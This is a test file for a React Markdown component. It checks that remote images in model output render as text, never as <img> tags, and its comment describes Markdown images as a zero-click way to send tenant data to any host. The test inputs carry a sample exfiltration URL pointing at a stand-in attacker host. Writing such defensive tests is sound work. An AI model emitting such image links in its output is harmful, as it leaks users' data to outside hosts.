import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { Markdown } from "./markdown";

describe("Markdown", () => {
  /**
   * WP-103: a Markdown image in model output is fetched the moment it renders — a zero-click way
   * to send tenant data to any host. It must render as text, with no <img> at all.
   */
  it("never renders a remote image", () => {
    const { container } = render(
      <Markdown>{"Totals below. ![pixel](https://evil.example/p?d=secret)"}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[pixel]");
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("drops an image with no alt text entirely", () => {
    const { container } = render(<Markdown>{"![](https://evil.example/p)"}</Markdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("still renders ordinary Markdown", () => {
    const { container } = render(<Markdown>{"**bold** and a [link](https://example.com)"}</Markdown>);
    expect(container.querySelector("strong")?.textContent).toBe("bold");
    expect(container.querySelector("a")?.getAttribute("href")).toBe("https://example.com");
  });
});
